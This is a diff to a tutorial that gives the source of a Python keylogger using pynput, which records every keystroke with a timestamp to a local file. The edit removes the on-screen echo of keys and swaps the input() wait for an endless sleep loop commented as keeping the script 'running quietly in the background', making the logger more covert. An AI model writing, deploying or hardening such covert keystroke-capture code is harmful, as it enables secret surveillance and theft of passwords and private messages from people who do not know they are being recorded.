@@ -54,11 +54,10 @@ Copy and save the following code as **keylogger.py**:
 ```python
 from pynput import keyboard
 from datetime import datetime
-
+import time
 def keyPressed(key):    
     """ Handles key press events, logs the key pressed along with the timestamp. """
     
-    print(str(key))  # Print the key pressed for debugging
     with open("keyfile.txt", 'a') as logKey:
         try:
             # Log printable character keys with timestamp
@@ -72,7 +71,9 @@ if __name__ == "__main__":
     # Initialize the key listener
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()  # Start listening
-    input()  # Keep the script running
+    # Keep the script running quietly in the background
+    while True:
+        time.sleep(1)
 ```
 
 #### **Run the Keylogger:**  
